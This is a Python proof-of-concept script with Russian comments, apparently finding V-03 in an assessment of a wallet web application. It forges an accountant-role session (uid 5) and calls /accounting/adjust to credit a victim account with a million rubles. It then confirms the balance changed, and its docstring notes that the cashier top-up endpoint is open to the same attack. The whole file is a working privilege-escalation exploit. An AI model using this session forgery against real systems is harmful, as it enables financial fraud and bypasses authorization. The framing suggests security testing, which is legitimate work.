# -*- coding: utf-8 -*-
"""V-03. Подделка роли бухгалтера -> начисление денег из воздуха.

С поддельной сессией accountant (uid 5) вызываем /accounting/adjust и
начисляем произвольную сумму любому счёту. То же работает для роли cashier
(/cashier/topup). Это прямое следствие V-01/V-02.
"""
import re

from wallet_client import Client, parser, banner, ok, fail


def balance(client):
    body = client.get("/")[2].decode("utf-8", "replace")
    m = re.search(r'class="value">([^<]+₽)', body)
    return m.group(1) if m else "?"


def main():
    a = parser("Начисление денег через поддельную роль бухгалтера").parse_args()

    victim = Client(a.base)
    victim.login("ivanov", "workplace1")
    before = balance(victim)
    banner(f"баланс ivanov до: {before}")

    acc = Client(a.base)
    acc.forge(5, "accountant")  # uid 5 = buch
    st, hdr, _ = acc.post_form("/accounting/adjust", {
        "login": "ivanov", "delta_rub": "1000000", "reason": "poc"})
    banner(f"/accounting/adjust -> {st}")

    after = balance(victim)
    banner(f"баланс ivanov после: {after}")
    if after == before:
        fail("баланс не изменился")
    ok("accountant-сессия подделана, баланс начислен без прав")


if __name__ == "__main__":
    main()
